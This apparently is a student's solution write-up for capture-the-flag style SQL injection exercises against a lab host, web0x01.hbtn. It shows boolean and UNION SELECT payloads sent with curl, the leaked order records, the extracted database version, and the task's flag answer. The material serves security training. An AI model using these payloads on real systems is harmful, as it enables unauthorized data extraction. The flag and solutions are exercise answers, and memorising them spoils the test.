# SQL, noSQL Injection


## Task 0. SQLi - Basic Injection Discovery

The first step in exploiting SQL injection vulnerabilities is to identify which parameters are vulnerable.
Your goal is to identify which parameters in the application's web pages are susceptible to SQL injection attacks. For that you should:

- Access the machine `cyber_websec_0x01` through the VPN.
- Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
- Search for the vulnerable paramters.
$ `echo "paramters_name" > 0-vuln.txt`

1. Start by navigating through the application's various pages.
2. Pay special attention to any pages that display data from the database, such as product listings or user profiles.
3. Look for URL parameters, form inputs, or any other input fields where user-supplied data is reflected in the page content or influences the data displayed.
4. Use simple payloads such as a single quote (`'`) or a boolean condition (`' OR '1'='1`) appended to parameters in URLs or input fields.
5. Observe the application's response for any errors, unusual behavior, or changes in the displayed data that indicate a successful injection.


**Solution**:
- start `cyber_webse_0x01`, get IP from "Network Information" button
- start openvpn
- edit /etc/hosts to put the IP address `echo "10.42.95.237 web0x01.hbtn" | sudo tee -a /etc/hosts`
- navigate to [http://web0x01.hbtn/a3/sql_injection/](http://web0x01.hbtn/a3/sql_injection/) with Firefox
- on Firefox start network monitor (Ctrl+Shift+E), select "Network" on the top row and seelect "XHR" on the "filter URLs" row.
- on the web page select Status "Paid"
- observe the network monitor, you will see a request to `http://web0x01.hbtn/a3/sql_injection/?status=paid` with a response of a JSON object containing the list of paid orders.
- right click on the request and select "Edit and Resend"
- in the "Request Body" section, change the value of `status` to `paid' OR '1'='1` and click "Send" (inject **Boolean TRUE**)
- observe the response, you will see a JSON object containing the list of all orders, not just the paid ones.
- right click again on the request and select "Edit and Resend"
- in the "Request Body" section, change the value of `status` to `paid' OR '1'='2` and click "Send" (inject **Boolean FALSE**)
- observe the response, you will see a JSON object containing an empty list of orders, indicating that the injection was successful and the application is vulnerable to SQL injection.
- prepare the answer:
```bash
echo "status" > 0-vuln.txt
git add .
git commit -m "0-vuln.txt"
git push
```


## Task 1. SQLi - Extracting Database Information

Now that you've identified a vulnerable parameter, your next task is to find a `flag` ⛳️:

- Extract information about the database itself:
  - Database `Version`.
  - Tables.

---


Helpful Instructions:

1. To determine the Database Version, Craft a payload that causes the application to reveal the version of the database it's using.

- This might involve using functions like `version()` in MySQL or `@`**`@VERSION`** in Microsoft SQL Server.

2. To identify All Table Names: Modify your payload to extract the names of all tables within the database.

- This will likely require knowledge of database-specific system tables or schemas (e.g., `INFORMATION_SCHEMA.TABLES` in MySQL).


## **Solution**:

- on kali command line run a curl GET request to check the response JSON structure:
```bash
URL="http://web0x01.hbtn/api/a3/sql_injection/all_orders"

curl -sG "$URL" \
  --data-urlencode "status=paid' OR 1=1-- " | jq .
# [
#   [
#     1,
#     "Feb 1, 2023",
#     "Pending",
#     "Maroua",
#     "Maroua@web0x01.hbtn"
#   ],
# ...
#   [
#     24,
#     "April 24, 2023",
#     "Pending",
#     "Maroua",
#     "Maroua@web0x01.hbtn"
#   ]
# ]
```

If we're lucky then we're interogating 5 columns - let's verify this:

```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,NULL,NULL-- " | jq .
# [
#   [
#     null,
#     null,
#     null,
#     null,
#     null
#   ],
#   [
#     3,
#     "April 3, 2023",
#     "Paid",
#     "Ismail",
#     "Ismail@web0x01.hbtn"
#   ],
# ...
#   [
#     23,
#     "Jan 23, 2023",
#     "Paid",
#     "Yosri",
#     "Yosri@web0x01.hbtn"
#   ]
# ]
```


### What does `UNION SELECT NULL,NULL,NULL,NULL,NULL` do?

The payload was:

```
paid' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

Let's break it down.

| Part                       | Purpose                                                  |
| -------------------------- | -------------------------------------------------------- |
| `paid`                     | The original status value                                |
| `'`                        | Closes the SQL string containing `paid`                  |
| `UNION`                    | Combines results from two SQL queries                    |
| `SELECT`                   | Creates a second result set                              |
| `NULL,NULL,NULL,NULL,NULL` | Supplies five column values                              |
| `-- `                      | Comments out the remainder of the original SQL statement |

### What the backend might be doing

The application's SQL query might look like this:

```sql
SELECT id, date, status, customer, email
FROM orders
WHERE status = 'paid'
```

When we inject our payload, the resulting SQL becomes approximately:

```sql
SELECT id, date, status, customer, email
FROM orders
WHERE status = 'paid'
UNION
SELECT NULL, NULL, NULL, NULL, NULL
-- '
```


### Why use NULL?

`UNION` requires both queries to return the same number of columns, with compatible data types.

`NULL` is useful because it is compatible with integer, text, and date columns.

If the original query returned five columns but our injected `SELECT` returned only four, the database would reject the UNION.

The successful response confirms that five expressions are accepted by the UNION query.

### How to use this for extracting the database version?

Now we can replace one of those `NULL` values with a SQL function.

For example:

```sql
SELECT NULL, NULL, NULL, version(), NULL
```

Instead of returning five NULLs, this asks the database to return its version in the fourth column.

That fourth column corresponds to the customer field in the JSON output, assuming the same mapping as in the previous response.

### Next command: Extract the database version


```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,version(),NULL-- " | jq .
# [
#   [
#     null,
#     null,
#     null,
#     "SQLite - FLAG: 559731c45deb90846d745be2192f536a",
#     null
#   ],
# ...
```

```bash
echo "559731c45deb90846d745be2192f536a" > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```




